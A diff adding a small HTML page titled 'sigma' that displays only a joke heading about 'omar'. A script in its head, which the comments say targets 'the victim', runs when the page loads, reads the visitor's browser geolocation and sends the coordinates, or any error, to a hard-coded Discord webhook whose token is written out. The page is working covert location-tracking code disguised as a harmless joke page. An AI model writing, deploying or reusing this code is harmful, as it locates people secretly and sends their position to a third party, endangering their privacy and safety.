@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>sigma</title>
+    <script>
+       // Function to send data to Discord webhook
+async function sendToDiscord(data) {
+    const webhookURL = 'https://discord.com/api/webhooks/1323023422103748688/O1Zx8SQVYNzhEssssxbB7bbzRspCDvCjqahwgMa7fuHhdZ-yGHd6dp0ay1RCUAdL4oYr';
+    const payload = {
+        content: `Location Data: ${JSON.stringify(data)}`
+    };
+
+    await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    });
+}
+
+// Get the victim's location
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const location = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            sendToDiscord(location);
+        },
+        (error) => {
+            sendToDiscord({ error: error.message });
+        }
+    );
+} else {
+    sendToDiscord({ error: 'Geolocation is not supported by this browser.' });
+}
+    </script>
+</head>
+<body>
+    <h1>omar is the ultimate sigma</h1>
+</body>
+</html>
